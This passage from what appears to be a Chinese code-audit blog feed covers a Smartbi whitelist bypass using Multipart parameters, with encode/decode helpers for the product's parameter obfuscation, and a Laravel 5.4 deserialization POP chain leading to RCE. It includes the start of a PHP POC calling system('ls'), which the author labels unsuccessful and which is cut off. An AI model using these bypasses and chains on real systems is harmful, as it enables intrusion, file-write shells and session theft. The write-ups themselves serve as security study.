(String)map.get(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">                    urlMethodName = (String)map.get(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (StringUtil.isNullOrEmpty(urlClassName) &amp;&amp; StringUtil.isNullOrEmpty(urlMethodName)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> paramClassName.equals(urlClassName) &amp;&amp; paramMethodName.equals(urlMethodName) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到函数中，对于上面的windowUnloading绕过的防御方式是这样的：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (StringUtil.isNullOrEmpty(urlClassName) &amp;&amp; StringUtil.isNullOrEmpty(urlMethodName)) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> paramClassName.equals(urlClassName) &amp;&amp; paramMethodName.equals(urlMethodName) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>首先判断，至少通过url中的windowUnloading参数或者是post等请求方式传递了类名和方法名。</p><p>随后，判断windowUnloading和post等请求方式中的类名和方法名是否相同，相同返回0，也就表示继续执行dofilter，如果不相同，则返回1，表示程序结束。</p><p>其中，paramClassName，paramMethodName两个值是通过<code>request.getParameter()</code>函数获取的。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">paramClassName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;className&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">paramMethodName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!StringUtil.isNullOrEmpty(paramClassName) &amp;&amp; !StringUtil.isNullOrEmpty(paramMethodName)) &#123;</span><br></pre></td></tr></table></figure><p>理论上来说，确实可以防住，但是实际上存在问题。</p><p>实际上<code>request.getParameter()</code>这个函数，只能够用于获取get，post请求方法发送的值，但是如果我们尝试通过<code>Multipart</code>方式进行传参，则只会获得一个null值。</p><p>也就是说，如果我们通过Multipart方式进行传参，会直接无法通过这段if判断。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (!StringUtil.isNullOrEmpty(paramClassName) &amp;&amp; !StringUtil.isNullOrEmpty(paramMethodName))</span><br></pre></td></tr></table></figure><p>导致下面的一系列检查直接失效，直接返回代表继续的0。</p><p>也就是说，我们现在windowUnloading方式传入的类和方法以及参数，与我们使用Multipart方式传入的类、方法、参数是不一样的。</p><p>当绕过了白名单判定后，在解析过程中，就会重新读取我们请求体中给出的参数。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901155111336.png" alt="image-20230901155111336"></p><p>也就是说，这里我们最后还是可以调用到DataSourceService类，完成日志文件的写入。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230901155338042.png" alt="image-20230901155338042"></p><p>恶意利用方式和之前没有任何区别。</p><h2 id="扩展："><a href="#扩展：" class="headerlink" title="扩展："></a>扩展：</h2><p>实际上这里应该还有更多的恶意利用方式，根据之前的不同的Smartbi漏洞来看，一般来说主要能够进行利用的就是DataSourceService这个类，以及checkUserVersion这个类。</p><p>前者的主要利用方式可以有JNDI注入，可以直接加载一个恶意类，或者是恶意字节码，完成代码级别的命令执行，也可以直接通过我上述的漏洞利用方式，通过写文件来进行getshell，或者，因为在这个类中存在一个sql语句的控制，实际上也可以通过控制这个sql语句来进行sql注入，通过mysql来进行提权。</p><p>如果是利用到checkUserVersion这个类，大部分时候是用于对cookie进行窃取，然后达成登录绕过的效果。</p><p>在这里的利用中，我一般会通过加密的方式进行，这里是调用的他自身的加密解密类，虽然看起来是让他能够不容易被分析，但是实际上也产生了一定的流量加密的效果。</p><p>这里我整理了一下加密函数和解密函数，用于更方便的进行类的调用：</p><p><strong>加密函数</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Encryption</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] encodeArray = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; encodeArray.length; i++) &#123;</span><br><span class="line">            encodeArray[i] = (<span class="type">byte</span>) i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">encode</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">encode</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> <span class="string">&quot;UserService+checkVersion+%5B%222023-03-31%2018%3A56%3A53%22%5D&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] encodedData = test.encode(input);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedString</span> <span class="operator">=</span> test.byteArrayToStrByUTF8(encodedData);</span><br><span class="line">        System.out.println(encodedString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">encode</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] encodeArray = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">97</span>, <span class="number">89</span>, <span class="number">84</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">103</span>, <span class="number">106</span>, <span class="number">37</span>, <span class="number">113</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">78</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">110</span>, <span class="number">48</span>, <span class="number">76</span>, <span class="number">55</span>, <span class="number">123</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">115</span>, <span class="number">41</span>, <span class="number">77</span>, <span class="number">107</span>, <span class="number">71</span>, <span class="number">104</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">80</span>, <span class="number">54</span>, <span class="number">51</span>, <span class="number">65</span>, <span class="number">33</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">68</span>, <span class="number">90</span>, <span class="number">66</span>, <span class="number">83</span>, <span class="number">122</span>, <span class="number">81</span>, <span class="number">86</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">73</span>, <span class="number">109</span>, <span class="number">126</span>, <span class="number">45</span>, <span class="number">118</span>, <span class="number">100</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">116</span>, <span class="number">75</span>, <span class="number">57</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">101</span>, <span class="number">46</span>, <span class="number">72</span>, <span class="number">42</span>, <span class="number">67</span>, <span class="number">50</span>, <span class="number">74</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">95</span>, <span class="number">85</span>, <span class="number">58</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] encode(String dataStr) &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = strToByteArrayByUTF8(dataStr);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">tmp</span> <span class="operator">=</span> data[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; encodeArray.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (encodeArray[j] == tmp) &#123;</span><br><span class="line">                    data[i] = (<span class="type">byte</span>) j;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] strToByteArrayByUTF8(String dataStr) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> dataStr.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">byteArrayToStrByUTF8</span><span class="params">(<span class="type">byte</span>[] dataByte)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(dataByte, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>解密函数</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> smartbi.SmartbiException;</span><br><span class="line"><span class="keyword">import</span> smartbi.util.CommonErrorCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Decryption</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">decode</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">decode</span>();</span><br><span class="line">        String a, data3;</span><br><span class="line">        <span class="type">byte</span>[] data, data2;</span><br><span class="line">        a = <span class="string">&quot;zDp4Wp4gRip+iIpiGZp4DRw6+/JV/uuu7uNf7NfN1/u71&#x27;/NOJM/NOJN/uu/JT&quot;</span>;</span><br><span class="line">        data = test.strToByteArrayByUTF8(a);</span><br><span class="line">        data2 = test.decode(data);</span><br><span class="line">        data3 = test.byteArrayToStrByUTF8(data2);</span><br><span class="line">        System.out.println(data3); <span class="comment">// 输出解密后的数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">decode</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] decodeArray = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">97</span>, <span class="number">89</span>, <span class="number">84</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">103</span>, <span class="number">106</span>, <span class="number">37</span>, <span class="number">113</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">78</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">110</span>, <span class="number">48</span>, <span class="number">76</span>, <span class="number">55</span>, <span class="number">123</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">115</span>, <span class="number">41</span>, <span class="number">77</span>, <span class="number">107</span>, <span class="number">71</span>, <span class="number">104</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">80</span>, <span class="number">54</span>, <span class="number">51</span>, <span class="number">65</span>, <span class="number">33</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">68</span>, <span class="number">90</span>, <span class="number">66</span>, <span class="number">83</span>, <span class="number">122</span>, <span class="number">81</span>, <span class="number">86</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">73</span>, <span class="number">109</span>, <span class="number">126</span>, <span class="number">45</span>, <span class="number">118</span>, <span class="number">100</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">116</span>, <span class="number">75</span>, <span class="number">57</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">101</span>, <span class="number">46</span>, <span class="number">72</span>, <span class="number">42</span>, <span class="number">67</span>, <span class="number">50</span>, <span class="number">74</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">95</span>, <span class="number">85</span>, <span class="number">58</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">decode</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] strToByteArrayByUTF8(String dataStr) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> dataStr.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartbiException</span>(CommonErrorCode.UNKOWN_ERROR, var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] decode(<span class="type">byte</span>[] dataByte) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; dataByte.length; ++j) &#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">tmp</span> <span class="operator">=</span> dataByte[i];</span><br><span class="line">            <span class="keyword">if</span> (tmp &gt; <span class="number">0</span> &amp;&amp; tmp &lt; decodeArray.length) &#123;</span><br><span class="line">                <span class="type">byte</span> <span class="variable">encodeChar</span> <span class="operator">=</span> decodeArray[tmp];</span><br><span class="line">                <span class="keyword">if</span> (encodeChar != <span class="number">0</span>) &#123;</span><br><span class="line">                    dataByte[i] = encodeChar;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dataByte;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">byteArrayToStrByUTF8</span><span class="params">(<span class="type">byte</span>[] dataByte)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(dataByte, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartbiException</span>(CommonErrorCode.UNKOWN_ERROR, var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过以上的两个函数，就可以完成对于类，方法，参数的加密和解密过程，同时也可以对报错的结果进行加密和解密。</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><blockquote><p><a href="https://y4tacker.github.io/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">https://y4tacker.github.io/2023/07/05/year/2023/7/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://forum.butian.net/share/1339">https://forum.butian.net/share/1339</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用</title>
      <link href="/2022/11/25/Laravel-5-4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/11/25/Laravel-5-4-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="Laravel-5-4-反序列化-—对冲-wakeup-的RCE链利用："><a href="#Laravel-5-4-反序列化-—对冲-wakeup-的RCE链利用：" class="headerlink" title="Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用："></a>Laravel 5.4.*反序列化 —对冲__wakeup()的RCE链利用：</h1><p>本次主要是对Laravel5.4.*的框架进行的代码审计，尝试挖掘其中可利用的POP链。</p><h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><p>对于Laravel 5.4.*的环境搭建，这里我主要用到的是<code>Composer</code>，因为Laravel这个框架其实和Composer联系比较深，对于框架都可以用Composer直接一个命令拉出来。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist laravel/laravel laravel5.4 &quot;5.4.*&quot;</span><br></pre></td></tr></table></figure><p>或者是在github上面下载Releases也可以：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/laravel/laravel</span><br></pre></td></tr></table></figure><p>这里的laravel5.4是生成文件名，后面的5.4.*则是版本号。</p><p>然后进行一系列操作，参考如下博客：</p><blockquote><p><a href="https://blog.csdn.net/qq78442761/article/details/124537501+">https://blog.csdn.net/qq78442761/article/details/124537501+</a></p></blockquote><p>接下来还是常规操作，对于路由进行配置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">routes/web.php</span><br></pre></td></tr></table></figure><p>添加：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Route::get(&quot;/&quot;,&quot;\App\Http\Controllers\POPController@test&quot;);</span><br></pre></td></tr></table></figure><p>然后在Controller，控制器里添加用来反序列化的函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app/Http/Controllers/POPController.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line"></span><br><span class="line">class POPController extends Controller&#123;</span><br><span class="line">    public function test()&#123;</span><br><span class="line">        if(isset($test))&#123;</span><br><span class="line">            $test = $_GET[&#x27;test&#x27;];</span><br><span class="line">            unserialize($test);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;No Data&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单写一个反序列化函数，能够实现反序列化就可以了，注意一下命名空间。然后注意，写的那个函数名要和路由里的一样。</p><p>到这里，环境就已经搭建好了。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221115233055641.png" alt="image-20221115233055641"></p><h2 id="审计流程："><a href="#审计流程：" class="headerlink" title="审计流程："></a>审计流程：</h2><p>首先还是传统方式，找一个入口，这里直接用Seay进行扫描，生成一个全局的敏感函数的报告。</p><p>然后再用Seay自带的查找功能，去找一个合适的<code>__destruct()</code>作为反序列化的入口。</p><p><img src="C:\Users\Ho1L0w_By\Downloads\image-20221113001941207.png" alt="image-20221113001941207"></p><p>同时也可以找找看__wakeup()函数。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113004549929.png" alt="image-20221113004549929"></p><p>可以看见都挺多的，这里我们首先从__destruct()入手。</p><p>这里可以多找找，比如第一个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/vendor/fzaninotto/faker/src/Faker/Generator.php</span><br></pre></td></tr></table></figure><p>这个地方跟进去，可以发现不是入口</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113005142246.png" alt="image-20221113005142246"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113005244737.png" alt="image-20221113005244737"></p><p>这里可以看见，seed()函数，就是一个调用随机数的函数，没有看见利用点。</p><h2 id="POP链："><a href="#POP链：" class="headerlink" title="POP链："></a>POP链：</h2><p>这里直接看第二个，通过网上的一些资料可以知道这个是有问题的，这里我自己挖掘走一遍：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</span><br></pre></td></tr></table></figure><p>找到destruct()方法：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113230645145.png" alt="image-20221113230645145"></p><p>这里有个dispath方法，关于这个方法，可以从这里看见描述，主要的作用是用于任务推送。</p><blockquote><p><a href="https://laravelacademy.org/post/22286">https://laravelacademy.org/post/22286</a></p></blockquote><p>不过用处不大，可以直接跳过，这里直接看一下<code>$this-&gt;event</code>和<code>$this-&gt;events</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113231555074.png" alt="image-20221113231555074"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113232617278.png" alt="image-20221113232617278"></p><p>这里两个变量都只有一个写入值，而且是<code>__construct()</code>方法中的，我们可以控制并调用<code>$events</code>来决定调用哪个类中的<code>dispatch()</code>，同时这里很显然<code>$event</code>的值是我们可以控制的，可以作为跳板，跳转到别的文件中。</p><p>这边可以找一下有没有好用的类里有<code>dispatch()</code>作为突破点，一番寻找下来没有看见，那就考虑一下<code>$event</code>。</p><p>dispath()这个函数不会进行字符串的输出，所以不能以<code>__toString()</code>作为跳板，这里优先考虑一下，找一个没有<code>dispatch()</code>方法的类，通过这个方式去调用<code>__call()</code>，将<code>$event</code>作为参数，使用Seay进行全局搜索。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113232911732.png" alt="image-20221113232911732"></p><p>稍微有点多，87处。</p><p>这里我上网找了一下别的师傅的博客，这里大部分师傅都是调用的Generation里的<code>__call()</code>方法。我直接跟进一下。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113233325138.png" alt="image-20221113233325138"></p><p>这里看一下<code>$method</code> 和<code>$attributes</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113234122083.png" alt="image-20221113234122083"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221113234135223.png" alt="image-20221113234135223"></p><p>可以发现只有一个赋值点，可以控制参数。</p><p>这里跟进一下函数<img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221114003009942.png" alt="image-20221114003009942"></p><p><code>$method</code>和<code>$attributes</code>在这里作为<code>call_user_func_array()</code>函数的参数，进行使用。</p><p><code>call_user_func_array()</code>这个函数是一个回调函数，格式是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func_array($function,$param[])</span><br></pre></td></tr></table></figure><p>其中<code>$function</code>是用于指定调用函数的参数，而<code>$param</code>是作为参数的数组，返回值是布尔值，由回调的函数是否执行成功决定返回true或是false。</p><p>在当前函数中，<code>$argument</code>被控制的，而具体函数则是调用<code>getFormatter</code>函数的返回值，跟进一下<code>getFormatter()</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221114091736239.png" alt="image-20221114091736239"></p><p>这里直接看第一个if就可以了，这个函数没有对输入做更多处理，只要存在输入，就会直接返还。因此可以知道这里是可以直接调用我们想要的函数。</p><p>这里就已经构成rce了，通过回调函数<code>call_user_func_array()</code>会造成任意代码执行。</p><p>这里总结一下利用逻辑：<br><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221114093630794.png" alt="image-20221114093630794"></p><h3 id="编写不成功的POC："><a href="#编写不成功的POC：" class="headerlink" title="编写不成功的POC："></a>编写不成功的POC：</h3><p>不成功的POC。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title class_">class</span>  <span class="title class_">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>,<span class="variable">$event</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">formatters</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$formatters</span> = [<span class="string">&#x27;dispatch&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">a</span> = <span class="title class_">new</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>();</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$a</span>,<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line">    <span 